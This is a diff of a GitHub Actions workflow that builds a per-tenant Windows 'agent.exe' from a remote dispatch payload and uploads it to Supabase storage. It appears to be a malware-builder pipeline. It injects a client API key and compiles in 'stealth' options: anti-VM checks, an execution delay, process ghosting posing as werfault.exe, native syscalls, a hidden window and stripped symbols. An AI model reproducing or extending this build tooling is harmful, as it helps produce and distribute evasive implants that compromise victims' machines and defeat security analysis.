@@ -7,17 +7,38 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      - name: Checkout Code
+        uses: actions/checkout@v4
 
       - name: Set up Go
         uses: actions/setup-go@v4
         with:
-          go-version: '1.21'
+          go-version: '1.23'
 
-      - name: Inject Credentials and Build
+      - name: Initialize and Tidy Module
         run: |
+          if [ ! -f go.mod ]; then go mod init client-source; fi
+          go mod tidy
+
+      - name: Inject Stealth and Build
+        run: |
+          # 1. Inject the Tenant API Key
           sed -i "s/REPLACE_ME_API_KEY/${{ github.event.client_payload.api_key }}/g" client.go
-          GOOS=windows GOARCH=amd64 go build -o agent.exe client.go
+
+          # 2. Extract Evasion Settings
+          DELAY=${{ github.event.client_payload.stealth.delay || '0' }}
+          ANTIVM=${{ github.event.client_payload.stealth.antiVM || 'false' }}
+          GHOST=${{ github.event.client_payload.stealth.processGhost || 'werfault.exe' }}
+          SYSCALLS=${{ github.event.client_payload.stealth.nativeSyscalls || 'true' }}
+
+          # 3. Standard Go Build (Default Compiler)
+          GOOS=windows GOARCH=amd64 go build \
+            -ldflags="-s -w -H=windowsgui \
+            -X main.ExecutionDelay=$DELAY \
+            -X main.AntiAnalysis=$ANTIVM \
+            -X main.GhostProcess=$GHOST \
+            -X main.UseSyscalls=$SYSCALLS" \
+            -o agent.exe .
 
       - name: Upload Binary to Supabase Storage
         run: |
